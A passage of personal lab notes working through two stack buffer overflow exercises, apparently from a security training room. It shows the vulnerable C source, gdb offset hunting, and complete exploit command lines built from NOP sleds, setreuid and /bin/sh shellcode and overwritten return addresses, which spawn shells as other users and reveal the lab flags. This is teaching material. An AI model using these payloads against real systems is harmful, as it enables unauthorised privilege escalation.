cat: secret.txt: Permission denied

not work 😢

As you can see above, we are not allowed to access the secret though, because we are not user2.

setreuid

Let’s use pwntools to generate a prefix to our shellcode to run SETREUID: 

┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ pwn shellcraft -f d amd64.linux.setreuid 1002
Command 'pwn' not found, but can be installed with:
sudo apt install python3-pwntools
Do you want to install it? (N/y)y
sudo apt install python3-pwntools

[user1@ip-10-10-2-237 ~]$ grep user2 /etc/passwd
user2:x:1002:1002::/home/user2:/bin/bash


┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ pwn shellcraft -f d amd64.linux.setreuid 1002
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.10/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.8.0)
\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05

>>> len('\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05')
14


Our payload now looks like this:

┌───────────────────┬────────────────────┬────────────────────┬────────────────────┬────────────────────┐
│ NOP sled (90)     │  setreuid (14)     │ shellcode (40)     │ random chars (8)   │ Memory address (6) │
└───────────────────┴────────────────────┴────────────────────┴────────────────────┴────────────────────┘
total length = 90 + 14 + 40 + 8 + 6 = 158

Let’s test: 

[user1@ip-10-10-69-210 overflow-3]$ ./buffer-overflow $(python2 -c "print '\x90'*90 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*8 + '\x88\xe2\xff\xff\xff\x7f'")
Here's a program that echo's out your input
������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1��������������
sh-4.2$ whoami
user2
sh-4.2$ cat secret.txt
omgyoudidthissocool!!

it works 😊 



```

![[Pasted image 20221017184228.png]]

Use the above method to open a shell and read the contents of the secret.txt file.
*omgyoudidthissocool!!*

### Buffer Overflow 2 

Look at the overflow-4 folder. Try to use your newly learnt buffer overflow techniques for this binary file.



```
sh-4.2$ exit
exit
[user1@ip-10-10-69-210 overflow-3]$ cd ../overflow-4
[user1@ip-10-10-69-210 overflow-4]$ ls
buffer-overflow-2  buffer-overflow-2.c  secret.txt
[user1@ip-10-10-69-210 overflow-4]$ cat buffer-overflow-2.c
#include <stdio.h>
#include <stdlib.h>

void concat_arg(char *string)
{
    char buffer[154] = "doggo";
    strcat(buffer, string);
    printf("new word is %s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    concat_arg(argv[1]);
}

[user1@ip-10-10-69-210 overflow-4]$ cat ../overflow-3/buffer-overflow.c
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}


let's do it again!
yep it's quite similar


[user1@ip-10-10-2-237 overflow-4]$ ls
buffer-overflow-2  buffer-overflow-2.c  secret.txt
[user1@ip-10-10-2-237 overflow-4]$ ./buffer-overflow-2 hi
new word is doggohi
[user1@ip-10-10-2-237 overflow-4]$ ./buffer-overflow-2 OFF
new word is doggoOFF


but this time doggo is add it so need to remove it

[user1@ip-10-10-2-237 overflow-4]$ ./buffer-overflow-2 $(python2 -c "print 'A' * 155")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault

offset

The buffer is 154 bytes, but the string doggo (5 characters) is added. So we should begin to test from 154-5. Let’s start with 8 more bytes: 


[user1@ip-10-10-2-237 overflow-4]$ gdb buffer-overflow-2
GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from buffer-overflow-2...(no debugging symbols found)...done.
(gdb) run $(python2 -c "print 'A' * 154-5+8")
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python2 -c "print 'A' * 154-5+8")
Traceback (most recent call last):
  File "<string>", line 1, in <module>
TypeError: unsupported operand type(s) for -: 'str' and 'int'
Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7abfe67 in __strcat_sse2_unaligned () from /lib64/libc.so.6


Not enough to overwrite the return address. Let’s add 8 more bytes: 

(gdb) run $(python2 -c "print 'A' * (154-5+8*2)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python2 -c "print 'A' * (154-5+8*2)")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000004141 in ?? ()

Good, we start seing 2 times ‘A’ overwritting the return address. We need 6 in total, so we need 4 more: 

(gdb) run $(python2 -c "print 'A' * (154-5+8*2+4)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python2 -c "print 'A' * (154-5+8*2+4)")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()

The offset is 169 (154-5+8*2+4). 

so here 169 -6 = 163-5 = 158

Shellcode

We’ll use the same shellcode (158 bytes) as previously, with the SETREUID. This time, we need to target user3 (ID is 1003), to be able to read secret.txt:

┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ ssh user1@10.10.2.237                            
user1@10.10.2.237's password: 
Last login: Tue Oct 18 00:33:01 2022 from ip-10-13-51-212.eu-west-1.compute.internal

       __|  __|_  )
       _|  (     /   Amazon Linux 2 AMI
      ___|\___|___|

https://aws.amazon.com/amazon-linux-2/
[user1@ip-10-10-2-237 ~]$ grep user3 /etc/passwd
user3:x:1003:1003::/home/user3:/bin/bash

┌──(kali㉿kali)-[~/bufferoverflow/learn]
└─$ pwn shellcraft -f d amd64.linux.setreuid 1003
\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05

>>> shellcode = '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
>>> len(shellcode)
54


Return address

Now, let’s have a look at our payload. It should look like this:

┌───────────────────┬────────────────────┬────────────────────┬────────────────────┐
│ NOP sled (90)     │ shellcode (54)     │ random chars (19)  │ Memory address (6) │
└───────────────────┴────────────────────┴────────────────────┴────────────────────┘
total length = 90 + 54 + 19 + 6 = 169

>>> payload = 'A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6
>>> len(payload)
169


now NOP sled


[user1@ip-10-10-2-237 overflow-4]$ gdb buffer-overflow-2
GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from buffer-overflow-2...(no debugging symbols found)...done.
(gdb) run $(python2 -c "print 'A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6")
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python2 -c "print 'A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�BBBBBBBBBBBBBBBBBBBCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x0000434343434343 in ?? ()
(gdb) x/100x $rsp-200
0x7fffffffe218: 0x004005a9      0x00000000      0xf7ffa268      0x00007fff
0x7fffffffe228: 0xffffe63e      0x00007fff      0x67676f64      0x4141416f
0x7fffffffe238: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe248: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe288: 0x41414141      0x31414141      0xebbf66ff      0x58716a03
0x7fffffffe298: 0x0ffe8948      0x583b6a05      0x49d23148      0x622f2fb8
0x7fffffffe2a8: 0x732f6e69      0xe8c14968      0x48504108      0x5752e789
0x7fffffffe2b8: 0x0fe68948      0x583c6a05      0x0fff3148      0x42424205
0x7fffffffe2c8: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe2d8: 0x43434343      0x00004343      0xffffe3d8      0x00007fff
0x7fffffffe2e8: 0x00000000      0x00000002      0x004005e0      0x00000000
0x7fffffffe2f8: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
0x7fffffffe308: 0xffffe3d8      0x00007fff      0x00040000      0x00000002
0x7fffffffe318: 0x004005ac      0x00000000      0x00000000      0x00000000
0x7fffffffe328: 0x1e3de574      0x1b8c4ce3      0x00400450      0x00000000
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) run $(python2 -c "print '\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python2 -c "print '\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6")
new word is doggo������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�BBBBBBBBBBBBBBBBBBBCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x0000434343434343 in ?? ()
(gdb) x/100x $rsp-200
0x7fffffffe218: 0x004005a9      0x00000000      0xf7ffa268      0x00007fff
0x7fffffffe228: 0xffffe63e      0x00007fff      0x67676f64      0x9090906f
0x7fffffffe238: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe248: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe258: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe268: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe278: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe288: 0x90909090      0x31909090      0xebbf66ff      0x58716a03
0x7fffffffe298: 0x0ffe8948      0x583b6a05      0x49d23148      0x622f2fb8
0x7fffffffe2a8: 0x732f6e69      0xe8c14968      0x48504108      0x5752e789
0x7fffffffe2b8: 0x0fe68948      0x583c6a05      0x0fff3148      0x42424205
0x7fffffffe2c8: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe2d8: 0x43434343      0x00004343      0xffffe3d8      0x00007fff
0x7fffffffe2e8: 0x00000000      0x00000002      0x004005e0      0x00000000
0x7fffffffe2f8: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
0x7fffffffe308: 0xffffe3d8      0x00007fff      0x00040000      0x00000002
0x7fffffffe318: 0x004005ac      0x00000000      0x00000000      0x00000000
0x7fffffffe328: 0xde9fddd9      0xd0cf00c1      0x00400450      0x00000000

0x7fffffffe288: 0x90909090      0x31909090      0xebbf66ff      0x58716a03 --> shellcode

yep Let’s take 0x7fffffffe278 as return address (between future NOP sled and beginning of shell code). 

Now, memory address: (revert taking 78 e2 ff ff ff ff 7f then adding \x to get hex)

\x78\xe2\xff\xff\xff\x7f


[user1@ip-10-10-2-237 overflow-4]$ ./buffer-overflow-2 $(python2 -c "print '\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\x78\xe2\xff\xff\xff\x7f'")
new word is doggo������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1��������������������x����
sh-4.2$ whoami
user3
sh-4.2$ cat secret.txt
wowanothertime!!

yep finally do it!

```
Use the same method to read the contents of the secret file!
*wowanothertime!!*


[[Phishing Emails 4]]